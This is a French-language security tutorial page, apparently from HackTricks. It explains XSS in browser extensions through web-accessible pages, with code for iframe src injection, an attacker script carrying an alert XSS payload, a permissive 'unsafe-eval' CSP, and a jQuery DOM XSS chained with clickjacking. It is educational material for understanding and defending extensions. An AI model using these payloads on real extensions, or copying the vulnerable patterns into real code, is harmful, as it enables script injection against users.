# BrowExt - Exemple de XSS

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## XSS sur Iframe

Le **Content script** cr√©e un Iframe indiquant une **URL dans les param√®tres de la source de l'iFrame** :
```javascript
chrome.storage.local.get("message", result =>
{
frame.src = chrome.runtime.getURL("message.html") +
"?message=" + encodeURIComponent(result.message) +
"&url=https://example.net/explanation";
});
```
Une page html expos√©e : **`message.html`**, accessible depuis le **navigateur**, contient un code tel que :
```java
$(() =>
{
let params = new URLSearchParams(location.search);
$(document.body).append(params.get("message") + " <button>Explain</button>");
$("body > button").click(() =>
{
chrome.tabs.create({ url: params.get("url") });
});
});
```
La page malveillante ex√©cute un script comme le suivant pour changer le message pour un **XSS payload** :
```javascript
setTimeout(() =>
{
let frame = document.querySelector("iframe:last-child");
let src = frame.src;

// Remove existing query parameters
src = src.replace(/\?.*/, "");

// Add malicious query parameters
src += "?message=" + encodeURIComponent("<script>alert('XSS')</script>");

// Load into frame
frame.src = src;
}, 1000);
```
Une politique de s√©curit√© de contenu permissive comme&#x20;
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
permettra l'ex√©cution du code JS.

Une autre mani√®re de d√©clencher le XSS √† volont√© consiste √† ex√©cuter :
```javascript
let frame = document.createElement("iframe");
frame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?message="
+ encodeURIComponent("<script>alert('XSS')</script>");
document.body.appendChild(frame);
```
## XSS bas√© sur le DOM + ClickJacking

La premi√®re vuln√©rabilit√© est la vuln√©rabilit√© XSS bas√©e sur le DOM dans **`/html/bookmarks.html`**, voici le JavaScript vuln√©rable inclus dans **`bookmarks.js`**:
```javascript
$('#btAdd').click(function() {
var btname = $('#txtName').val();
if ($('.custom-button .name').filter(function() {
return $(this).text() === btname;
}).length) return false;

var span = $('<span class="custom-button">');
span.html('<span class="name">' + btname + '</span>');
span.append('<a href="javascript:void(0)" title="remove">x</a>');
span.attr('title', btname);
span.data('id', (new Date().getTime()));
$('div.custom-buttons .existing').append(span);
save_options();
});
```
Le JavaScript ci-dessus prend la **valeur** de la zone de texte **`txtName`** et utilise **la concat√©nation de cha√Ænes pour construire du HTML** qui est ajout√© au DOM via la fonction [‚Äúappend()‚Äù](https://api.jquery.com/append/) de jQuery.

Normalement, la politique de s√©curit√© du contenu (CSP) des extensions Chrome devrait emp√™cher l'exploitation de cette vuln√©rabilit√©. Cependant, en raison de **l'assouplissement de cette politique via** [**‚Äòunsafe-eval‚Äô**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) et de l'utilisation des API DOM de jQuery, cela a quand m√™me pu √™tre **exploit√©**. Cela est d√ª au fait que de nombreuses API DOM de jQuery utilisent [‚ÄúglobalEval()‚Äù](https://api.jquery.com/jquery.globaleval/), qui passe automatiquement les scripts √† [‚Äúeval()‚Äù](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) lors de l'ajout au DOM.

Bien que cela soit une vuln√©rabilit√© s√©rieuse, l'exploitation est assez limit√©e en raison de **l'interaction utilisateur requise pour l'exploiter**. La victime devrait ouvrir la page, coller une charge utile de Cross-site Scripting (XSS) dans le champ et cliquer sur le bouton "Add" pour l'exploiter.

Afin de mieux armer cette vuln√©rabilit√©, nous utilisons une vuln√©rabilit√© s√©par√©e (**clickjacking**) pour renforcer l'attaque.

Ce qui suit est un extrait du manifeste de l'extension Chrome :
```json
...trimmed for brevity...
"web_accessible_resources": [
"_locales/*",
"bundle/*",
"dist/*",
"assets/*",
"font/*",
"html/bookmarks.html",
"css/*.css",
"js/*.js",
"js/jquery/*.js",
"js/lang/*"
],
...trimmed for brevity...
```
La section ci-dessus d√©montre que l'extension utilise une politique de **`web_accessible_resources`** tr√®s large.

La page **`/html/bookmarks.html`** peut √©galement √™tre **encadr√©e** et donc **exploit√©e** via le **clickjacking**. Nous abusons de cela pour int√©grer cette page dans notre page web, et **superposer le cadre avec des √©l√©ments DOM pour red√©finir la mise en page**. Cela fait en sorte que la victime ne se rende pas compte qu'elle **interagit r√©ellement avec l'extension en dessous**. L'animation suivante d√©montre cet effet (consultez l'animation dans le [**rapport original**](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)).

## R√©f√©rences

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
